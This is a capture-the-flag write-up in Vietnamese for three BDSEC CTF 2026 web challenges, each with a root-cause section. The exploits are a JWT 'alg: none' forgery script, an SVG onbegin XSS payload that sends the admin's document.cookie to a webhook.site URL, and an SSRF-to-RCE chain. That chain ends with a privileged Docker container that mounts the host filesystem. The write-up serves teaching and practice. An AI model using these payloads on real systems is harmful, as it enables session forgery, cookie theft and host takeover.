# BDSEC CTF 2026

![alt text](image-1.png)

## 1. Web - Admin Portal

### Mô tả bài

Challenge cung cấp một web service sử dụng JWT để quản lý phiên đăng nhập. Sau khi đăng nhập bằng tài khoản thường, server trả về một session JWT chứa thông tin user.

Mục tiêu của bài là sửa JWT để trở thành admin, sau đó truy cập endpoint admin và lấy flag.

### Phân tích

Sau khi đăng nhập, kiểm tra cookie hoặc response thì thấy server cấp JWT, ví dụ:

```http
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.FrGxig8JSYGSQU7DWTl4wUwMNV782oxV6uPehibrlpc
```

Decode session bằng jwt.io hoặc script thì thấy header có trường `alg`:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Payload chứa thông tin user:

```json
{
  "username": "guest",
  "role": "user"
}
```

Điểm quan trọng là server dựa vào JWT payload để xác định quyền. Vì vậy hướng khai thác là sửa:

```json
"role": "user"
```

thành:

```json
"role": "admin"
```

Nếu chỉ sửa payload rồi giữ nguyên signature cũ thì session sẽ bị reject, vì chữ ký không còn hợp lệ.

Tuy nhiên, thử đổi thuật toán trong JWT header sang `none`:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Sau đó bỏ phần signature, session vẫn được server chấp nhận. Điều này chứng minh backend bị lỗi **JWT none algorithm vulnerability**.

JWT hợp lệ trong trường hợp này có dạng:

```text
base64url(header).base64url(payload).
```

Lưu ý session phải có dấu chấm cuối cùng `.` để biểu diễn phần signature rỗng.

session sau khi sửa sẽ có dạng:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoiYWRtaW4ifQ.
```

Header decode ra:

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Payload decode ra:

```json
{
  "username": "guest",
  "role": "admin"
}
```

Do server chấp nhận `alg: none`, nó không kiểm tra signature nữa. Vì vậy attacker có thể tự tạo session admin mà không cần biết secret key.

![alt text](image-2.png)

**Flag**:

```
bdsec{n0ne_4lg_m34ns_n0_s1gn4tur3}
```

**Script lấy flag**

Script tạo JWT `alg: none`:

```python
import base64
import json
import requests

TARGET = "http://66.228.54.80:8989/" 

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode().rstrip("=")

header = {
    "alg": "none",
    "typ": "JWT"
}

payload = {
    "username": "guest",
    "role": "admin"
}

token = (
    b64url(json.dumps(header, separators=(",", ":")).encode())
    + "."
    + b64url(json.dumps(payload, separators=(",", ":")).encode())
    + "."
)

print("[+] Forged JWT:")
print(token)

cookies = {
    "session": token
}

r = requests.get(
    TARGET + "/admin",
    cookies=cookies,
    allow_redirects=False
)

print("[+] Status:", r.status_code)
print("[+] Location:", r.headers.get("Location"))
print("[+] Response:")
print(r.text)
```


### Root cause

```text
1. Server chấp nhận JWT có alg: none.
2. Server không ép thuật toán verify cố định.
3. Server tin role trong JWT sau khi verify sai cách.
4. Không kiểm tra signature bắt buộc với mọi session.
```


## 2. Web - Ticketly

### Mô tả bài

Challenge cung cấp một web service người dùng có thể đăng ký tài khoản, tạo ticket hỗ trợ và report ticket đó cho admin review.

Luồng chính của bài:

```text
1. Register
2. Submit a ticket
3. Report ticket to admin
4. Admin mở ticket để review
```

Điểm đáng chú ý trên giao diện là phần mô tả ticket cho phép rich formatting, đồng thời ticket sau khi report sẽ được admin đọc. Đây là mô hình rất quen thuộc của dạng stored XSS / blind XSS: attacker chèn payload vào nội dung ticket, payload được lưu lại trong database, sau đó admin mở ticket bằng session của admin và payload chạy trong context của admin.

Mục tiêu cuối cùng là lấy flag. Trong bài này, flag nằm trực tiếp trong cookie của admin với tên cookie là `flag`.


### Phân tích

Sau khi đăng ký tài khoản và tạo ticket, thử nhập payload HTML đơn giản vào title/body để kiểm tra ứng dụng xử lý user input như thế nào.

Payload test ban đầu:

```html
<b>XSS-TEST</b>
```

Kết quả quan sát được:

```text
title -> bị escape, hiển thị nguyên văn <b>XSS-TEST</b>
body  -> được render thành chữ in đậm
```

Điều này cho thấy trường title đã được encode/escape tương đối đúng, nhưng trường body lại được render như HTML thật. Vì vậy hướng khai thác nằm ở phần mô tả ticket, tức `body`.

Tuy nhiên việc thẻ `<b>` chạy chưa đủ để kết luận có XSS, vì `<b>` chỉ là thẻ định dạng an toàn. Cần kiểm tra tiếp xem event handler hoặc JavaScript có được thực thi không.

Thử payload phổ biến với `<img>`:

```html
<img src=x onerror="alert(1)">
```

Ứng dụng chặn request và trả về:

```text
Request blocked by BDSEC Firewall™
Your ticket contained content that matched a malicious signature and was not saved.

Signature: IMG_TAG
```

Như vậy firewall của bài có blacklist theo signature, cụ thể là chặn thẻ `<img>`. Điều này không có nghĩa toàn bộ XSS bị chặn, mà chỉ chứng minh payload phổ biến với `<img onerror>` bị phát hiện.

Vì `<img>` bị chặn, cần chuyển sang các vector khác không khớp signature `IMG_TAG`.

Một payload vượt qua filter trong bài là dùng SVG kèm thẻ animation và event `onbegin`.

Payload dạng đơn giản:

```html
<svg><animate attributeName=x dur=1s onbegin="alert(1)"></animate></svg>
```

Ý tưởng:

```text
<svg>      -> không bị chặn bởi IMG_TAG
<animate>  -> animation tự chạy khi SVG được render
onbegin    -> event được kích hoạt khi animation bắt đầu
```

Do đây là blind XSS, không nên chỉ dựa vào `alert(1)`, vì payload cần chạy trong trình duyệt của admin. Vì vậy cần một callback server bên ngoài để xác nhận admin bot đã mở ticket và payload đã thực thi.

Trong bài này dùng `webhook.site` làm nơi nhận callback.

Webhook dùng trong quá trình solve:

```text
https://webhook.site/fd129225-8704-471f-a8d7-39ccfc02e1db
```

Trước khi lấy flag, cần kiểm tra payload có chạy trong browser của admin không. Ta gửi một request rất nhỏ về webhook.

Payload ping:

```html
<svg><animate attributeName=x dur=1s onbegin="location='https://webhook.site/fd129225-8704-471f-a8d7-39ccfc02e1db?ping='+Date.now()"></animate></svg>
```

![alt text](image-4.png)


do đó chứng minh được:

```text
1. Ticket đã được admin bot mở.
2. Payload SVG đã vượt qua BDSEC Firewall™.
3. JavaScript đã chạy trong browser của admin.
4. Có thể tiếp tục exfil dữ liệu từ context admin.
```

Ban đầu có thể nghĩ tới việc fetch lại HTML của trang admin, nhưng trong bài này flag không nằm trong HTML. Flag nằm trực tiếp trong cookie của admin với tên cookie là `flag`.

Vì cookie này không được đặt `HttpOnly`, JavaScript có thể đọc được qua:

```js
document.cookie
```

Do đó payload solve là đọc `document.cookie`, encode lại, rồi gửi về webhook.

Payload chính:

```html
<svg><animate attributeName=x dur=1s onbegin="location='https://webhook.site/fd129225-8704-471f-a8d7-39ccfc02e1db?c='+encodeURIComponent(document.cookie)"></animate></svg>
```

![alt text](image-3.png)

**Flag:**

```text
BDSEC{w4f_byp4ss3d_4dm1n_c00k13_l00t3d}
```


### Root cause

Root cause của bài nằm ở nhiều lớp xử lý không an toàn:

```text
1. Ticket body cho phép render HTML từ user input.
2. Sanitizer/WAF dựa vào blacklist signature thay vì allowlist nghiêm ngặt.
3. Firewall chặn payload phổ biến như IMG_TAG nhưng bỏ sót SVG animation event.
4. Các event handler như onbegin vẫn được giữ lại.
5. Admin bot mở ticket do user kiểm soát bằng session admin thật.
6. Cookie `flag` của admin không được đặt HttpOnly, nên JavaScript đọc được qua document.cookie.
```


## 3. Web - Partner Sync

### Mô tả bài

Challenge cung cấp một web service tên `BDSEC Partner Directory Sync`, cho phép người dùng nhập URL partner để service backend gọi tới. Request chính có các tham số:

```text
partner_url
method
body_b64
```

Mục tiêu là lợi dụng SSRF để truy cập các service nội bộ, sau đó leo tiếp qua RCE và Docker API để đọc flag trên host.

### Phân tích

Đầu tiên xem source của trang chính thì thấy comment để lại một file JS legacy:

```html
<!-- TODO(OPS-410): pull /static/js/ops-console.js out of the bundle before
     launch, on-call doesn't need the browser console tool anymore now
     that internal-api migration is done -->
```


Truy cập `/static/js/ops-console.js` thì file này leak khá nhiều thông tin quan trọng:

```javascript
// Service map
//   internal-api -> internal-api:9000
//   dind-gate    -> dind-gate:7000/rpc

const ALLOWED_PREFIX = "http://partners.bdsec.local";

function isAllowedPartnerUrl(url) {
  return url.startsWith(ALLOWED_PREFIX);
}
```

Ở đây có hai điểm đáng chú ý:

- Service nội bộ `internal-api` chạy ở `internal-api:9000`.
- Hàm check URL chỉ dùng `startsWith("http://partners.bdsec.local")`.

Vì vậy có thể bypass allowlist bằng URL userinfo:

```text
http://partners.bdsec.local@internal-api:9000/...
```

Với URL trên, phần trước dấu `@` là userinfo, còn host thật là `internal-api`. Nhờ đó có thể SSRF tới internal service.


file JS leak tên service là `job runner`, nhưng chưa ghi rõ route. Khi probe qua SSRF:

```text
http://partners.bdsec.local@internal-api:9000/health
```

![alt text](image-6.png)

trả về service `internal-api`, chứng minh đã reach đúng host. Tiếp tục thử các route ngắn liên quan tới job runner thì `/job` trả response khác `404` như `405 Method Not Allowed` với GET hoặc lỗi parse job khi POST body sai. Như vậy `/job` là route tồn tại. Sau khi có RCE và đọc source, điều này được xác nhận bằng Flask route:

```python
@app.route("/job", methods=["POST"])
def run_job():
    ...
```

![alt text](image-7.png)

Đến đây cần gửi được POST body nhị phân vào `/job`. UI bình thường chỉ gửi một tham số:

```javascript
body: "partner_url=" + encodeURIComponent(url)
```

Nhưng khi intercept request `/sync-partner` bằng Burp và thử thêm tham số, thấy backend còn nhận thêm `method`. Nếu gọi `/job` bằng `GET` thì nhận `405 Method Not Allowed`, còn khi thêm:

```text
method=POST
```

response chuyển sang lỗi parse job. Điều này chứng minh request đã thật sự được forward bằng `POST` tới `/job`, chỉ là body đang rỗng hoặc sai format.

![alt text](image-8.png)

Tiếp theo cần truyền `raw binary job` qua form `application/x-www-form-urlencoded`. Vì raw bytes không tiện đưa trực tiếp vào form, thử dạng base64. Khi thêm tham số:

```text
body_b64=<base64 của buildJob(...)>
```

response của `internal-api` bắt đầu đổi theo nội dung job. Test đơn giản nhất là gọi handler an toàn `system.uptime` trước:

```text
handler = system.uptime
arg     = anything
```

Nếu `body_b64` đúng format, response trả output của `uptime`. Sau đó đổi handler thành `system.run` để chạy command tùy ý.

![alt text](image-9.png)

File JS này cũng leak luôn format job của `internal-api`:

```javascript
function buildJob(handler, arg) {
  const enc = new TextEncoder();
  const h = enc.encode(handler);
  const a = enc.encode(arg);
  const buf = new Uint8Array(4 + h.length + 4 + a.length);
  const view = new DataView(buf.buffer);
  view.setUint32(0, h.length, false);
  buf.set(h, 4);
  view.setUint32(4 + h.length, a.length, false);
  buf.set(a, 4 + h.length + 4);
  return buf;
}
```

Tức là `body` gửi tới `/job` phải có dạng:

```text
[u32 BE handler length][handler bytes][u32 BE arg length][arg bytes]
```

Trong comment của JS cũng ghi rõ namespace nguy hiểm:

```javascript
// known namespaces:
//   system  -> ops helpers
//     system.run -> debug-only, do NOT wire this up anywhere public
```

Sau khi gọi được `system.run`, dùng RCE đọc `/app/app.py` để xác nhận service resolve handler bằng `getattr()` mà không có allowlist đầy đủ:

```python
HANDLERS = {
    "report": importlib.import_module("builtins"),
    "system": SystemNS,
}
```

Trong `SystemNS`, `system.run` gọi shell trực tiếp:

```python
subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
```

Vì vậy handler `system.run` cho phép chạy command tùy ý. Sau khi có RCE, kiểm tra môi trường và đọc token nội bộ:

![alt text](image-10.png)

```bash
env | sort
cat /app_shared/.internal_token
```

![alt text](image-11.png)

Token thu được:

```text
4858911fd90282dce8902b1e8429fcf2
```

Trong `/static/js/ops-console.js` còn có hint cho stage tiếp theo:

```javascript
function buildRpc(token, cmd, opts = {}) {
  return {
    token,
    op: "run",
    image: opts.image || "alpine",
    cmd,
    binds: opts.binds || [],
    privileged: !!opts.privileged,
  };
}
```

Điều này cho biết `dind-gate` là orchestration proxy để chạy container. Tuy nhiên khi probe tiếp thì phát hiện Docker daemon mở trực tiếp trong mạng nội bộ:

```text
http://dind:2375/version
```

![alt text](image-13.png)

![alt text](image-12.png)

Do Docker API không cần auth, có thể tạo container `alpine`, mount root filesystem của Docker host vào `/host`, rồi đọc file trong `/vault`.

Các file quan trọng:

```text
/vault/flag.txt
/vault/read_flag
/vault/policy_check_expected.txt
```

Đọc trực tiếp:

```bash
cat /host/vault/flag.txt
```

Payload ở bài này được dựng dựa trên hàm `PartnerOps.buildJob(handler, arg)` bị leak trong `/static/js/ops-console.js`. `body_b64` không phải base64 trực tiếp của command, mà là base64 của một job nhị phân theo format của `internal-api`:

```text
[4 bytes length của handler][handler][4 bytes length của arg][arg]
```

Handler cần gọi là:

```text
system.run
```

Arg chính là command sẽ được truyền vào shell. Vì command cuối khá dài và chứa nhiều dấu quote, payload cần được dựng theo từng lớp để tránh lỗi encode khi đi qua form `application/x-www-form-urlencoded`:

1. Tạo JSON cho Docker API để spawn container `alpine`.
2. Base64 JSON đó rồi nhúng vào Python one-liner.
3. Python one-liner gọi Docker daemon `dind:2375`.
4. Đưa Python one-liner vào custom protocol `system.run`.
5. Base64 toàn bộ job nhị phân thành `body_b64`.

JSON dùng để tạo container:

```json
{
  "Image": "alpine",
  "Cmd": ["sh", "-c", "cat /host/vault/flag.txt"],
  "Tty": true,
  "HostConfig": {
    "Binds": ["/:/host:ro"],
    "Privileged": true
  }
}
```

Container này mount root filesystem của Docker host vào `/host`, nên file flag trên host có thể đọc qua:

```bash
cat /host/vault/flag.txt
```

Khi encode job, hai trường độ dài phải dùng unsigned 32-bit big-endian đúng như hàm `buildJob()` trong file JS leak. Nếu chỉ base64 command rồi đưa vào `body_b64`, `internal-api` sẽ parse sai vì thiếu phần length-prefix của handler và arg.

Payload cuối được gửi về endpoint ngoài như sau:

```text
partner_url=http://partners.bdsec.local@internal-api:9000/job
method=POST
body_b64=<base64 custom protocol>
```

![alt text](image.png)

```
{"Image":"alpine","Cmd":["sh","-c","echo ===TRY_CAT===; cat /host/vault/flag.txt 2>&1; echo; echo ===TRY_CHROOT_CAT===; chroot /host /bin/sh -c 'cat /vault/flag.txt' 2>&1; echo; echo ===TRY_READ_FLAG===; chroot /host /vault/read_flag 2>&1; echo"],"Tty":true,"HostConfig":{"Binds":["/:/host:ro"],"Privileged":true}}
```

Form trên giao diện chỉ gửi `partner_url`, nhưng endpoint `/sync-partner` vẫn nhận thêm `method=POST` và `body_b64`, nên có thể gửi request raw bằng Burp Repeater. Phần quan trọng khi reproduce là giữ đúng ba lớp encode: JSON Docker API -> command cho `system.run` -> job nhị phân của `internal-api`.

### Root cause

Có ba lỗi chính dẫn tới full chain:

1. SSRF filter kiểm tra domain không chặt, cho phép bypass bằng cú pháp userinfo `trusted-domain@real-host`.
2. Internal API resolve handler bằng `getattr()` thiếu allowlist, làm lộ handler `system.run` có khả năng chạy shell command.
3. Docker daemon `dind:2375` expose trong internal network mà không có authentication, cho phép tạo privileged container và mount filesystem host.
